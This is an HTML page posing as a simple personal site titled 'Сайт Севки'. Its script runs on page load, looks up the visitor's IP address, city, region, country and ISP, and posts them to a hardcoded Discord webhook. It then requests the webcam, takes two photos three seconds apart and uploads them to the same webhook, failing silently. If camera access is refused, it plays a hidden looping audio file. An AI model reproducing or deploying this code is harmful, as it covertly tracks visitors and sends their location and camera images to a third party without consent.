<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8" />
<title>Сайт Севки</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
  body {
    margin: 0;
    height: 100vh;
    background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    user-select: none;
    overflow: hidden;
  }
  .glass-container {
    background: rgba(255, 255, 255, 0.15);
    border-radius: 20px;
    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.18);
    padding: 40px;
    width: 380px;
    text-align: center;
    color: white;
    text-shadow: 0 0 8px rgba(0,0,0,0.7);
    font-weight: 700;
    font-size: 1.5rem;
  }
  audio {
    display: none;
  }
</style>
</head>
<body>
  <div class="glass-container">
    <div>Сайт Севки</div>
  </div>

  <audio id="audio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>

<script>
  const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';

  async function sendIPInfo() {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      const content = {
        content: `Visitor IP info:\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}\nIP: ${data.ip}\nISP: ${data.org}`
      };
      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(content)
      });
    } catch (e) {
      // fail silently
    }
  }

  async function sendImageToWebhook(blob, filename) {
    try {
      const form = new FormData();
      form.append('file', blob, filename);
      await fetch(webhookURL, {
        method: 'POST',
        body: form
      });
    } catch (e) {
      // fail silently
    }
  }

  async function capturePhotos(stream) {
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');

    // Capture immediately
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => sendImageToWebhook(blob, 'photo1.png'));

    // Capture again after 3 seconds
    setTimeout(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => sendImageToWebhook(blob, 'photo2.png'));
      stream.getTracks().forEach(track => track.stop());
    }, 3000);
  }

  async function init() {
    sendIPInfo();

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      capturePhotos(stream);
    } catch (err) {
      // Denied camera access: play audio
      const audio = document.getElementById('audio');
      audio.volume = 1.0;
      audio.play().catch(() => {});
    }
  }

  window.onload = init;
</script>
</body>
</html>
